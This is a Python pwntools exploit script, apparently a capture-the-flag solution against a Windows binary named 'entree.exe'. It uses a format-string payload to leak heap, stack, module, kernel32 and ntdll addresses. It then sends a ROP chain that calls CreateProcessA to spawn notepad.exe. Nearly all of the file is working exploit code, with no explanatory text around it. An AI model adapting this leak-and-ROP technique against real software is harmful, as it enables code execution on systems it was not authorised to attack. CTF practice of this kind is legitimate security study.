from pwn import *

s=process("./entree.exe")

def inp(num, data):
    s.sendlineafter("Enter number of bytes: ",str(num))
    s.sendlineafter("Enter data: ",str(data))



payload = "%p"*30
inp(len(payload),payload)
s.recvuntil("p")
data = s.recvline()[:-2]
print len(data)

leak=[]
for i in range(0,len(data),8):
    leak.append(data[i:i+8])

heap_base = int(leak[7],16)-1973 
base = int(leak[0],16)-1973 
stack = int(leak[4],16)+48
kernel32 = int(leak[23],16)-25433 
ntdll = int(leak[27],16)-420500 
log.info("Heap Base = " + hex(heap_base))
log.info("Base = " + hex(base))
log.info("Stack = " + hex(stack))
log.info("KERNEL32 = " + hex(kernel32))
log.info("ntdll = " + hex(ntdll))

"""
if( !CreateProcess( NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    )
"""

main = p32(base+0x1050-0x1000)
ret = (base+0x16e)
log.info("ret = " + hex(ret))
CreateProcessA=p32(kernel32+213088-65536) 
WinExec = p32(kernel32+383664-65536)
log.info("CreateProcessA = " + hex(u32(CreateProcessA)))
#windbg.attach(s)
rop = "exe\x00"[::-1] + "pad."[::-1] + "note"[::-1] + p32(3)[::-1] + p32(stack+0x138)[::-1] + p32(stack+0x100)[::-1] + p32(0)*6 + p32(stack-20+8)[::-1] + p32(0) + main[::-1] + CreateProcessA[::-1] + p32(ret)[::-1]*100 
inp(stack,"" + rop + "b"*stack)


s.interactive()
